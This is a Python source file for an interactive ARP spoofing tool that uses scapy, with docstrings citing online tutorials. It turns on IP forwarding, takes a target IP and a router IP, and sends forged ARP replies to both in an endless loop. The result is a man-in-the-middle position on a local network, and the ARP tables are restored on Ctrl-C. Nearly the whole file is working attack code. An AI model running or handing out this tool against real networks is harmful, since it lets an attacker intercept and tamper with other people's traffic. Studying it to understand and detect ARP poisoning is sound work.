from colorama import init as colorama_init
from colorama import Fore
from colorama import Style


import scapy.all
import time
from Networkscanner import scan , is_ipv4 ,scan_network,print_table


default_ip_forward_value = 0
"""
https://www.thepythoncode.com/article/building-arp-spoofer-using-scapy

ARP Spoofing Address Resolution Protocol (ARP) is a protocol that enables
network communications to reach a specific device on the network. ARP translates
Internet Protocol (IP) addresses to a Media Access Control (MAC) address, and
vice versa. Most commonly, devices use ARP to contact the router or gateway that
enables them to connect to the Internet.

"""
"""
https://www.geeksforgeeks.org/python-how-to-create-an-arp-spoofer-using-scapy/
Algorithm
1) Get the IP address that we want to spoof
2) Get the MAC address of the IP that we want to spoof
3)Then create a spoofing packet using the ARP() function to set the target IP, Spoof IP and its MAC address that we found above.
4)Start the spoofing
4)Display the information of the numbers of packets sent
5)Finally, re-set the ARP tables of the spoofed address to defaults after spoofing
"""

def ipv4_forwarding():
    # funtion to enable ip forwarding
    file_name="/proc/sys/net/ipv4/ip_forward"
    with open(file_name,'r') as f:
        value = f.read()
        if (int(value)==1):
            print(f"{Fore.GREEN}[*] Ip Forwarding already Enabled !{Style.RESET_ALL}")
            global default_ip_forward_value
            default_ip_forward_value = 1
        else :
            with open(file_name,"w") as f:
                print(f"{Fore.GREEN}[*] Enabling Ip forwarding ! {Style.RESET_ALL}")
                f.write("1")

def ipv4_forwarding_restore():
    #funtion to restore the default value of the file
    print(f"{Fore.YELLOW}\n[*] Restoring Ip forwarding value !{Style.RESET_ALL}")
    file_name="/proc/sys/net/ipv4/ip_forward"
    with open(file_name) as f:
        value=f.read()
        if (int(value)!=default_ip_forward_value):
            with open(file_name,"w") as f:
                f.write("0")

def get_mac(ip):
    try:
        #get mac address for the ip address we spoof
        arp_request = scapy.all.ARP(pdst=ip)
        broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")               
        arp_request_boroadcast =  broadcast/arp_request
        # in the following request we will ony get one result as we only provided one ip address to map to its mac address
        answered = scapy.all.srp(arp_request_boroadcast, timeout=.5, verbose=0)[0]
        # returnt the first element of the list
        return answered[0][1].hwsrc
    except Exception:
        pass

def spoof(target_ip,spoofIpAddress):
    #create a arp packet arp response (scapy.all.ls(scapy.ARP))
    #change the paramenter of arp op as by default it is 1 i.e. arp request but we need a forge a response
    #telling the target that we are router
    #target is the host that we are tell
    #spoof is the we are telling the target that whant are we 
    Target_mac= get_mac(target_ip)
    #in the we dont specify psrc and hwsrc as it automaitcaly get our 
    #pdst = > target ip
    #hwdst => target mac
    #psrc => pretend to be comming from
    #in this request hwsrc is the mac address of our machine
    packet = scapy.all.ARP(op=2, pdst=target_ip,hwdst=Target_mac,psrc=spoofIpAddress)
    # print(packet.show())
    # print(packet.summary())
    #send the packet
    scapy.all.send(packet,verbose=False)

def restore(destination_ip,source_ip):
    #restoring the arp table on the trage and router side
    destination_mac=get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    #pdst = > target ip
    #hwdst => target mac
    #psrc => pretend to be comming from
    #in the the hwsrc is the actual mac address of the the router
    packet= scapy.all.ARP(op=2, pdst=destination_ip,hwdst=destination_mac,psrc=source_ip,hwsrc=source_mac)
    # Send crafted Packet
    scapy.all.send(packet,verbose=False)

def arp_spoof():
    while True:
        target_ip = input("[+] Please Enter Target ip address : ")
        if (is_ipv4(target_ip)!="Port"):
            print(f"{Fore.YELLOW}[!] Please enter a valid ip address{Style.RESET_ALL}")
        else :
            break
    result = host_up(target_ip)
    if not result:
        print(f"{Fore.YELLOW}[!] Target Is not Up!{Style.RESET_ALL}")
        return
    while True:
        router_ip = input("[+] Enter router ip address ( You can use route commnad ) : ")
        if (is_ipv4(router_ip)!="Port"):
            print(f"{Fore.YELLOW}[!] Please enter a valid ip address{Style.RESET_ALL}")
        result = host_up(router_ip)
        if result:
            break
        if not result:
            print(f"{Fore.YELLOW}[!] Router / Gateway is Down  []  Please check gateway ip address{Style.RESET_ALL}")
    #enable ip forwarding
    ipv4_forwarding()
    #counter for packet send
    counter = 0
    try:
        while True:
            #spoof targer that we are router
            spoof(target_ip,router_ip)
            #spoof router that we are target 
            spoof(router_ip,target_ip)
            #increase counter
            counter = counter + 2 
            print(f"\r[*] Packet Sent : {Fore.MAGENTA}" + str(counter), end=f"{Style.RESET_ALL}")
            #sleep for 2 sec so the no bottlenacking on the network
            time.sleep(2)
    except KeyboardInterrupt:
        print(f"{Fore.YELLOW}\n[*] Restoring Targer ARP Table{Style.RESET_ALL}")
        restore(target_ip,router_ip)
        print(f"{Fore.YELLOW}\n[*] Restoring Router ARP Table{Style.RESET_ALL}")
        restore(router_ip,target_ip)
        ipv4_forwarding_restore()

def host_up(ipaddress):
    #To chec that he ip address is up or reachable
    arp_request = scapy.all.ARP(pdst=ipaddress)
    broadcast = scapy.all.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boroadcast =  broadcast/arp_request
    answered = scapy.all.srp(arp_request_boroadcast, timeout=.5, verbose=0)[0]
    return answered

def arp_spoofing_main():
    #main funtion of arp spoofer
    print(f"{Fore.BLACK}Welcome to Arp Spoofer\n{Style.RESET_ALL}")
    try:
        test = input(f"{Fore.YELLOW}[+] Do you want to scan the Network For the Nodes: Y?N : {Style.RESET_ALL}")
        if (test=="Y" or test=="y"):
            while True:
                ip = input("[+] Enter network cider notation : ")
                if(is_ipv4(ip)=="Scan"):
                    technique = int(input("[+] Select technique to use (1 for ping, 2 for ARP): "))
                    if technique == 1:
                            print(f"{Fore.GREEN}Scanning with ping...{Fore.RESET}")
                            reachable_ips = scan_network(ip)
                            print_table(reachable_ips)
                            print(f"{Fore.GREEN}Ping scan complete.{Fore.RESET}")
                    elif technique == 2:
                            print(f"{Fore.GREEN}Scanning with ARP...{Fore.RESET}")
                            scan(ip)
                            print(f"{Fore.GREEN}ARP scan complete.{Fore.RESET}")
                    else:
                            print("Enter a valid ip Address Or technique")
                    arp_spoof()
                    break
                else:
                    print(f"{Fore.RED}[!] Please enter a valid cider notation{Style.RESET_ALL}")
        elif(test=="n" or test == "N"):
            arp_spoof()
        else: 
            print(f"{Fore.RED}[!] Enter a Valid Choice{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}\n[+] Redirecting to main menu...{Style.RESET_ALL}")
        time.sleep(3)
    except KeyboardInterrupt:
        print(f"{Fore.RED}\n[!] Redirecting to main menu...{Style.RESET_ALL}")
        time.sleep(3)
    